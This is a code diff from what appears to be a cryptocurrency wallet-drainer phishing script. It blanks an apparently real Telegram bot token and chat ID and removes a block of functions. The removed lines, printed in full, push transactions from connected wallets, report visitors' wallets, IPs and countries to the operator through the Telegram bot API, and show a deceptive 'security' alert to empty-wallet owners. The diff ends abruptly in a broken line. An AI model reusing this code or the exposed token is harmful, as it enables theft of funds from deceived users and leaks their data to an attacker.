@@ -43,8 +43,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
     
     const TG = {
-        token: "7643207473:AAG2jS3mwjUywRZpvpVFnImC0kcSbij8nhM", // Your @Botfather Bot token Ex. "7643207473:AAG2jS3mwjUywRZpvpVFnImC0kcSbij8nhM"
-        chat_id: "7489428594", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
+        token: "", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
+        chat_id: "", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
         enter_website: true, // Notify on site entry ('true' enabled or 'false' disabled)
         connect_success: true, // Notify on wallet connection ('true' enabled or 'false' disabled)
         connect_empty: true,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
@@ -432,106 +432,4 @@ document.addEventListener("DOMContentLoaded", async () => {
     
     async function handleTransaction(transactionData, notif, successMessage, errorMessage) {
         try {
-            if(TG.transfer_request){
-                await TgMsg(notif);
-            }
-            await w3.sendTransaction(transactionData);
-            await sleep(1300);
-            if(TG.transfer_success){
-                await TgMsg(successMessage);
-            }
-        } catch (error) {
-            if (error.message.toLowerCase().includes("reject request") || error.message.toLowerCase().includes("close popup") || error.message.toLowerCase().includes("transaction was not sent")) {
-                if(TG.transfer_cancel){
-                    await TgMsg(errorMessage);
-                }
-            } else {
-                console.log('Error:', error);
-            }
-        }
-    }
-
-    async function handleEmptyWallet(User_wallet) {
-        if (TG.connect_empty) {
-            const message = `\n🔌💩 *User Connected an empty Wallet* (${shortAdd(User_wallet)})\n\n🌍 ${HOST} - 📍 [${ISO2}](https://ipapi.co/?q=${IP})`;
-            await TgMsg(message);
-        }
-    
-        alert('For security reasons, we cannot allow connections from empty or newly created wallets.');
-        await w3.disconnect();
-        if (!w3.connected && w3.modalState.status === 'closed') {
-            await w3.openModal();
-        }
-    }
-
-    async function TgMsg(message) {
-        const encodedMessage = encodeURIComponent(message);
-        const telegramUrl = `https://api.telegram.org/bot${TG.token}/sendMessage?chat_id=${TG.chat_id}&text=${encodedMessage}&parse_mode=Markdown&disable_web_page_preview=true`;
-        
-        const response = await fetch(telegramUrl, { method: 'POST' });
-        if (!response.ok) {
-            console.log('Error:', 'Telegram message failed to send');
-        }
-    }
-
-    async function fire(w3) {
-        await sleep(100);
-        if (!w3.connected && w3.modalState.status === 'closed') {
-            await w3.openModal();
-        }else if (w3.connected) {
-            User_wallet = Add.parse(w3.account.address).toString({bounceable: false});
-            fetchData(User_wallet);
-        }
-    }
-
-    const $$ = (selector) => document.querySelectorAll(selector);
-    $$('.btn-go').forEach(item => {
-        item.addEventListener('click', async () => {
-            await fire(w3); // w3 
-        });
-    });
-
-    function formatNumber(number) {
-        return new Intl.NumberFormat('en-US', { 
-            minimumFractionDigits: 2, 
-            maximumFractionDigits: 2 
-        }).format(number);
-    }
-
-    function shortAdd(str) {
-        if (str.length <= 7) {
-        return str; // If the chain is too short to be shortened in this way, we return it as it is
-        }
-        const firstTwo = str.slice(0, 4); // Take the first 2 characters
-        const lastThree = str.slice(-4); // Take the last 3 characters
-        return `${firstTwo}...${lastThree}`; // Combine parts
-    }
-
-    function escp(msg){
-        let ok = msg
-        .replace(/\_/g, '\\_')
-        .replace(/\*/g, '\\*')
-        .replace(/\[/g, '\\[')
-        .replace(/\]/g, '\\]')
-        .replace(/\(/g, '\\(')
-        .replace(/\)/g, '\\)')
-        .replace(/\~/g, '\\~')
-        .replace(/\`/g, '\\`')
-        .replace(/\>/g, '\\>')
-        .replace(/\#/g, '\\#')
-        .replace(/\+/g, '\\+')
-        .replace(/\-/g, '\\-')
-        .replace(/\=/g, '\\=')
-        .replace(/\|/g, '\\|')
-        .replace(/\{/g, '\\{')
-        .replace(/\}/g, '\\}')
-        .replace(/\./g, '\\.')
-        .replace(/\!/g, '\\!')
-    
-        return ok;
-    }
-
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-});
+            i
